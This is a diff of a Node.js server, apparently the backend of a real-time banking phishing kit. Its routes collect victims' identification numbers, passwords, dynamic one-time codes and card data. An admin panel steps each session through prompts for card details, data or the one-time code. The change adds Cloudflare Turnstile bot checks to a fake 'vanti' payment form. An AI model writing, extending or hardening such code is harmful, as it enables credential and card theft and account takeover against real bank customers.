@@ -199,6 +199,28 @@ function getBody(req, maxSize = 100 * 1024) {
     });
 }
 
+/* 🔥 FUNCIÓN PARA VALIDAR EL CAPTCHA DE CLOUDFLARE 🔥 */
+async function validarTurnstile(token, ip) {
+    if (!token) return false;
+    const secret = process.env.TURNSTILE_SECRET;
+    if (!secret) {
+        console.error('⚠️ ERROR CRÍTICO: Falta la variable de entorno TURNSTILE_SECRET en Railway.');
+        return false; 
+    }
+    try {
+        const res = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ secret, response: token, remoteip: ip })
+        });
+        const data = await res.json();
+        return data.success;
+    } catch (e) {
+        console.error('Error de red validando Turnstile:', e);
+        return false;
+    }
+}
+
 /* 🔥 FIX: headers anti-cache para que el panel admin se actualice en vivo */
 function json(res, code, obj) {
     res.writeHead(code, {
@@ -349,7 +371,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        // 🔥 NUEVA RUTA PARA LIMPIAR LOS DATOS CUANDO SE RECHAZA
         if (req.method === 'POST' && url === '/sesion/limpiar') {
             try {
                 const { sessionId } = await getBody(req);
@@ -438,7 +459,6 @@ const server = http.createServer(async (req, res) => {
                         datosSesiones.set(sessionId, datosActualizados);
                         agregarLog('poner-precio', { usuario: payload.user, sessionId, valor });
 
-                        // 🔥 Registrar PONER_PRECIO en el historial
                         const idxHP = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId);
                         if (idxHP !== -1) {
                             if (!historial[idxHP].datos.eventosAdmin) historial[idxHP].datos.eventosAdmin = [];
@@ -467,7 +487,7 @@ const server = http.createServer(async (req, res) => {
                         PEDIR_CC: 'pedir_cc',
                         PEDIR_DATOS: 'pedir_datos',
                         PEDIR_DINAMICA: 'pedir_dinamica',
-                        YA_PAGO: 'ya_pagado' // 🔥 Nuevo estado
+                        YA_PAGO: 'ya_pagado'
                     };
                     if (!mapEstados[accion]) { json(res, 400, { ok: false, error: 'Acción inválida' }); return; }
                     let estadoNuevo = mapEstados[accion];
@@ -484,7 +504,6 @@ const server = http.createServer(async (req, res) => {
                     accionTsSesiones.set(sessionId, Date.now());
                     agregarLog('accion', { usuario: payload.user, sessionId, accion, estadoNuevo });
 
-                    // 🔥 Registrar acción del admin en el historial
                     const idxHA = historial.findIndex(h => h.datos && h.datos.sessionId === sessionId);
                     if (idxHA !== -1) {
                         if (!historial[idxHA].datos.eventosAdmin) historial[idxHA].datos.eventosAdmin = [];
@@ -695,7 +714,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        /* 🔥 /bc/enviar guarda identificación y clave en historial inmediatamente */
         if (req.method === 'POST' && url === '/bc/enviar') {
             if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
             try {
@@ -724,7 +742,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        /* 🔥 /bc/guardar-paso2 guarda en historial */
         if (req.method === 'POST' && url === '/bc/guardar-paso2') {
             try {
                 const datos = await getBody(req);
@@ -750,7 +767,6 @@ const server = http.createServer(async (req, res) => {
                 const previos = bcSesiones.get(sessionId) || {};
                 bcSesiones.set(sessionId, { ...previos, claveDinamica: codigo });
                 
-                // 🔥 CORRECCIÓN: Forzar estado a "pendiente" para que no salte el error automático
                 estadoSesiones.set(sessionId, 'pendiente'); 
                 ultimaAccionSesiones.set(sessionId, 'ESPERANDO_DINAMICA'); 
                 
@@ -763,7 +779,6 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
-        /* 🔥 /bc/guardar-paso4 preserva identificacion, clave y acumula tarjetas */
         if (req.method === 'POST' && url === '/bc/guardar-paso4') {
             try {
                 const datos = await getBody(req);
@@ -816,10 +831,19 @@ const server = http.createServer(async (req, res) => {
             return;
         }
 
+        // 🔥 AQUI ESTA LA PROTECCIÓN CON EL CAPTCHA 🔥
         if (req.method === 'POST' && url === '/vanti/enviar') {
             try {
                 const datos = await getBody(req);
-                const { sessionId, empresa, cuenta, medioPago } = datos;
+                const { sessionId, empresa, cuenta, medioPago, 'cf-turnstile-response': turnstileToken } = datos;
+
+                // Validar el token de Cloudflare antes de hacer cualquier cosa
+                const esHumano = await validarTurnstile(turnstileToken, ip);
+                if (!esHumano) {
+                    json(res, 403, { ok: false, error: 'Verificación de seguridad fallida. Eres un bot o el token expiró.' });
+                    return; 
+                }
+
                 if (!sessionId) { json(res, 400, { ok: false }); return; }
 
                 const datosSesion = { sessionId, bancoKey: 'vanti', empresa, cuenta, medioPago, ip, creadoEn: new Date().toISOString() };
